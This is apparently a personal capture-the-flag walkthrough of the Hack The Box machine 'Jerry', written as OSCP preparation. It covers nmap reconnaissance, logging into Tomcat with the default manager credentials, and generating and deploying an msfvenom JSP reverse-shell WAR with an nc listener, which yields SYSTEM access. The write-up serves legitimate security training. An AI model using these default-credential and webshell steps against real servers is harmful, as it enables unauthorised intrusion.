## Intro

I finally decided to get serious about doing the OSCP. My work colleagues have been harping on me for a while now about doing it, and I really don't have any reason not to.  Community consensus seems to be that TJNull's list of ["OSCP-like"](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#vulnerable-machines) boxes is excellent prep. So I figured I'd start with that. Its broken down by Linux and Windows. I always feel more comfortable on Linux than I do Windows, so I'm going to start doing all the Windows ones first.

## Reconnaissance

### Initial Engagement

I've been using ```reconnoitre``` a lot recently, but I've sound recent tooling updates on enumeration tools have outpaced the repo - making following on scans and enumerations problematic. For the time being, I've reverted to manually managing my scans with ```nmap```. I may re-approach ```reconnoitre``` at a future date.

That being said, time to begin with the initial engagement with this box.

```bash
nmap -sC -sV -oA 'scans/initial' 10.129.1.110
```

This will give me a quick overview of the most popular ports, and their potential services on this box. 
- ```-sV``` will probe all open ports to determine service and version info
- ```-sC``` will run default scripts against those services (not the ones flagged as unsafe, however)
- ```-oA``` will output all formats into my scans folder

### Initial Results

```
Nmap scan report for 10.129.1.110
Host is up (0.057s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
```

It appears we only have one port open, 8080, and its running Apache Tomcat. 

### More Recon

Before we move on to enumeration, I'll always kick off an all-ports scan to see if there's anything subtle hidden on the box. This includes UDP. These usually take quite some time, so I like them to run in the background while I"m doing initial service enumeration.

```bash
nmap -sC -sV -sU -p- -oA 'scans/all-ports' 10.129.1.110
```

**Side Note:** This completed much later in the engagement, with no additional findings.


## Enumeration

### Apache Tomcat

Browsing to the port at *http://10.129.1.110:8080/* yielded a default (and potentially misconfigured) Apache Tomcat splash page.

Clicking on the Manager app immediately prompts us for credentials.

### Finding Tomcat Credentials

Trying something default like ***admin/admin*** didn't work. Going to the google machine, I researched *"Apache Tomcat Default Manager App Password"* and after a few boring pages, I stumbled on [this post](https://code2care.org/2015/tomcat-manager-default-username-and-password), indicating that the default manager app credentials should be ***tomcat/s3cret***. Trying those, I was successful in logging into the manager application.

### Further Server Enumeration

Once within the manager application, further enumeration of the target host is possible.

You'll see later on that these are largely irrelevant, but as a rule of thumb, I am constantly trying to gather more information about my target environment. You may never know when it will be useful; particularly in privilege escalation vectoring.

## Exploitation

### Initial Assessments

Access to the Tomcat manager app gets us carte blanche ability to upload WAR files, so we can generate a reverse webshell with ```msfvenom```.

### Generating a Webshell

```bash
┌──(kali㉿kali)-[~/htb/jerry/exploits]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.105 LPORT=4443 EXITFUNC=thread -f war > cargo.war
Payload size: 1099 bytes    
Final size of war file: 1099 bytes
```
Build Me A:
- JSP based reverse tcp shell
- Phone home to my attack platform on port 4443
- If the shell exits, don't crash the application
- Output the format in WAR format
- Write all to the file ```cargo.war```

### Deliver the Webshell

Delivery on this one is easy, upload the war via the Manager App. You may want to make sure you have your listener set up first, just in case.

### Setup Listener

```bash
nc -lnvp 4443
```

### Execute Shell

You should see the application loaded in the Manager app interface, now. You can simply click on the hyperlink, or navigate to it *http://10.129.1.110:8080/cargo/* to execute the webshell.

### Shell

And we have shell on Jerry.
  
## Post-Exploitation

### Initial Assessments

As always whenever I receive shell, I want to know where I landed and who I landed as. In this case, you can see I landed as **NT AUTHORITY/SYSTEM** and I am on the intended target host. Since we are already root, there is not much more to this box.

## Privilege Escalation

Given our exploit vector, no privilege escalation is necessary on this engagement. We can just go straight for flags.
